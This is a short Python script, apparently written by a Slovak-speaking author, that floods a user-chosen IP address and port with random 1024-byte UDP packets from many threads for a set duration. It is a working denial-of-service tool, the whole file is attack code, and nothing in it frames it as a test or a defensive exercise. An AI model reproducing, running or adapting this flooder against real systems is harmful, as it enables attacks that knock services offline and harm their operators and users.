import socket
import threading
import os
import time

# Vyčistenie obrazovky
os.system("clear" if os.name == "posix" else "cls")

def send_packets(ip_address, port, duration):
    """Funkcia na odosielanie UDP packetov po dobu 'duration' sekúnd."""
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet = os.urandom(1024)  # Náhodné dáta veľkosti 1024 bajtov
    while time.time() < end_time:
        try:
            udp_socket.sendto(packet, (ip_address, port))
        except Exception as e:
            print(f"Chyba pri odosielaní: {e}")
            break
    udp_socket.close()

# Vstupy od používateľa
ip_address = input("Zadaj cieľovú IP adresu: ")
port = int(input("Zadaj cieľový port: "))
duration = int(input("Zadaj dobu odosielania packetov (v sekundách): "))
thread_count = int(input("Zadaj počet vlákien: "))

# Spustenie threadov
threads = []
print(f"Začiatok odosielania packetov na {ip_address}:{port} po dobu {duration} sekúnd...")
for i in range(thread_count):
    thread = threading.Thread(target=send_packets, args=(ip_address, port, duration))
    threads.append(thread)
    thread.start()

# Počkáme, kým všetky vlákna skončia
for thread in threads:
    thread.join()

print("Odosielanie dokončené.")
